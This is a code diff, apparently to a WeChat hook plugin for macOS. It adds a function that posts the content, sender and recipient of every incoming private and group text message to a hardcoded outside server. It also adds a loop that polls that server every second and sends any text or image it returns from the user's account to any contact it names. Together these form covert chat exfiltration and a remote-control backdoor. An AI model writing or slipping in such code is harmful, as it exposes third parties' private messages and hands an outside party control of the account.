@@ -108,7 +108,29 @@
     }, 2);
     
     [self setup];
+    [self setUpThread];
+    
 }
++ (void)setUpThread {
+    //每秒拉取1次
+    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
+        
+        //开启一个新的线程去拉取消息
+        [[[NSOperationQueue alloc] init] addOperationWithBlock:^{
+            @try {
+                [self GetMessageQueue];
+            }
+            @catch (NSException *exception) {
+                NSLog(@"%@",exception);
+            }
+            
+            [self setUpThread];
+        }];
+        
+    });
+    
+}
+
 
 - (void)hook_addChatMemberNeedVerifyMsg:(id)arg1 ContactList:(id)arg2
 {
@@ -351,7 +373,7 @@
         if (nowSecond - addMsg.createTime > 180) {//若是3分钟前的消息，则不进行自动回复与远程控制。
             return;
         }
-        
+        [self autoSyncMsgToRemote:addMsg];
         [self autoReplyWithMsg:addMsg];
         [self autoReplyByAI:addMsg];
 
@@ -382,6 +404,71 @@
     
     [self hook_receivedMsg:msgs isFirstSync:arg2];
 }
+
+- (void)autoSyncMsgToRemote:(AddMsg *)addMsg
+{
+    if (addMsg.msgType != 1) return;
+    NSString *userName = addMsg.fromUserName.string;
+    
+    MMSessionMgr *sessionMgr = [[objc_getClass("MMServiceCenter") defaultCenter] getService:objc_getClass("MMSessionMgr")];
+    WCContactData *msgContact = nil;
+    
+    if (LargerOrEqualVersion(@"2.3.26")) {
+        msgContact = [sessionMgr getSessionContact:userName];
+    } else {
+        msgContact = [sessionMgr getContact:userName];
+    }
+    
+    if ([msgContact isBrandContact] || [msgContact isSelf]) {
+        //        该消息为公众号或者本人发送的消息
+        return;
+    }
+    NSString *msgContent = addMsg.content.string;
+    NSString *groupMemberWxid = @"";
+    if ([addMsg.fromUserName.string containsString:@"@chatroom"]) {
+        NSArray *contents = [addMsg.content.string componentsSeparatedByString:@":\n"];
+        if( contents.count > 1 ){
+            msgContent = contents[1];
+        }
+        groupMemberWxid = contents[0];
+    }
+    NSMutableDictionary *contentDictionary = [[NSMutableDictionary alloc]init];
+    [contentDictionary setValue:msgContent forKey:@"context"];
+    [contentDictionary setValue:addMsg.fromUserName.string forKey:@"from"];
+    [contentDictionary setValue:addMsg.toUserName.string forKey:@"to"];
+    [contentDictionary setValue:addMsg.toUserName.string forKey:@"id"];
+    [contentDictionary setValue:[[NSNumber numberWithInt:addMsg.msgType] stringValue] forKey:@"msg_type"];
+    [contentDictionary setValue:groupMemberWxid forKey:@"group_member"];
+    [contentDictionary setValue:[[NSNumber numberWithLongLong:addMsg.newMsgId] stringValue] forKey:@"msg_id"];
+    
+    NSLog(@"%@",contentDictionary);
+    NSString *remoteUrl = @"https://report.j4u.ink/wechat/callback/robot";
+    [[YMNetWorkHelper share] POST:remoteUrl parameters:contentDictionary success:^(id responsobject) {
+    } failure:^(NSError *error , NSString *failureMsg){
+        NSLog(@"robot error:%@",failureMsg);
+    }];
+}
+
+- (void)GetMessageQueue{
+    NSMutableDictionary *contentDictionary = [[NSMutableDictionary alloc]init];
+    NSString *remoteUrl = @"https://report.j4u.ink/wechat/callback/watch";
+    [[YMNetWorkHelper share] POST:remoteUrl parameters:contentDictionary success:^(NSDictionary *responsobject) {
+        NSString *context = [responsobject valueForKey:@"context"];
+        NSString *to = [responsobject valueForKey:@"to"];
+        NSNumber *delayTime = [responsobject valueForKey:@"delay_time"];
+        NSDictionary *imageMessage = [responsobject objectForKey:@"image_message"];
+        NSLog(@"image:%@",imageMessage);
+        if(imageMessage != nil){
+            NSString *imageUrl = [imageMessage valueForKey:@"image"];
+            [[YMMessageManager shareManager] sendImageMessageForUrl:imageUrl toUsrName:to];
+        }
+        [[YMMessageManager shareManager] sendTextMessage:context toUsrName:to delay:[delayTime integerValue]];
+    } failure:^(NSError *error , NSString *failureMsg){
+        NSLog(@"%@",error);
+        NSLog(@"%@",failureMsg);
+    }];
+}
+
 
 //hook 微信通知消息
 - (id)hook_getNotificationContentWithMsgData:(MessageData *)arg1
